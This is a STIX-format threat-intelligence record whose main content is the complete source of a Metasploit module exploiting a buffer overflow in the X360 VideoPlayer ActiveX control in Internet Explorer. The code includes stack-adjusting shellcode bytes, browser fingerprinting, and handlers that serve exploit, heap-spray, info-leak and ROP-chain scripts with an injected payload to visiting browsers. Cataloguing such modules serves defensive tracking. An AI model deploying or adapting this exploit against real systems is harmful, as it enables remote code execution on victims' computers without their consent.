{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--001a3f51-7e31-402b-ace7-513b8a137d11",
    "created": "2024-08-14T16:42:03.677112Z",
    "modified": "2024-08-14T16:42:03.677116Z",
    "name": "\"X360 VideoPlayer ActiveX Control Buffer Overflow\"",
    "description": " This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the X360 Software. By setting an overly long value to 'ConvertFile()', an attacker can overrun a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/x360_video_player_set_text_bof.rb",
            "external_id": "x360_video_player_set_text_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "https://rh0dev.github.io/blog/2015/fun-with-info-leaks/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => \"X360 VideoPlayer ActiveX Control Buffer Overflow\",\n      'Description'         => %q{\n        This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the\n        X360 Software. By setting an overly long value to 'ConvertFile()', an attacker can overrun\n        a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Rh0',     # vulnerability discovery and exploit, all the hard work\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['EDB', '35948'],\n          ['URL', 'https://rh0dev.github.io/blog/2015/fun-with-info-leaks/']\n        ],\n      'Payload'             =>\n        {\n          'Space'          => 1024,\n          'DisableNops'    => true,\n          'PrependEncoder' => stack_adjust\n        },\n      'DefaultOptions'      =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'            => 'win',\n      'Arch'                => ARCH_X86,\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: '{4B3476C6-185A-4D19-BB09-718B565FA67B}',\n              method: 'SetText'\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS,\n          :ua_name => Msf::HttpClients::IE,\n          :ua_ver  => '10.0'\n        },\n      'Targets'             =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2015-01-30',\n      'DefaultTarget'       => 0))\n  end\n\n  def stack_adjust\n    adjust = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    adjust << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    adjust << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    adjust << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n\n    adjust\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    case request.uri\n    when /exploit.js/\n      print_status(\"Sending exploit.js...\")\n      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}\n      send_exploit_html(cli, exploit_template(cli, target_info), headers)\n    when /sprayer.js/\n      print_status(\"Sending sprayer.js...\")\n      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}\n      send_exploit_html(cli, sprayer_template(cli, target_info), headers)\n    when /informer.js/\n      print_status(\"Sending informer.js...\")\n      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}\n      send_exploit_html(cli, informer_template(cli, target_info), headers)\n    when /rop_builder.js/\n      print_status(\"Sending rop_builder.js...\")\n      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}\n      send_exploit_html(cli, rop_builder_template(cli, target_info), headers)\n    else\n      print_status(\"Sending main.html...\")\n      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'text/html'}\n      send_exploit_html(cli, main_template(cli, target_info), headers)\n    end\n  end\n\n  def main_template(cli, target_info)\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'main.html')\n    template = ''\n    File.open(path, 'rb') { |f| template = strip_comments(f.read) }\n\n    return template, binding()\n  end\n\n  def exploit_template(cli, target_info)\n    shellcode = Rex::Text.to_hex(get_payload(cli, target_info))\n\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'exploit.js')\n    template = ''\n    File.open(path, 'rb') { |f| template = strip_comments(f.read) }\n\n    return template, binding()\n  end\n\n  def sprayer_template(cli, target_info)\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'sprayer.js')\n    template = ''\n    File.open(path, 'rb') { |f| template = strip_comments(f.read) }\n\n    return template, binding()\n  end\n\n  def informer_template(cli, target_info)\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'informer.js')\n    template = ''\n    File.open(path, 'rb') { |f| template = strip_comments(f.read) }\n\n    return template, binding()\n  end\n\n  def rop_builder_template(cli, target_info)\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'rop_builder.js')\n    template = ''\n    File.open(path, 'rb') { |f| template = strip_comments(f.read) }\n\n    return template, binding()\n  end\n\n  def strip_comments(input)\n    input.gsub(/\\/\\/.*$/, '')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-30",
    "x_mitre_platforms": [
        "win'"
    ]
}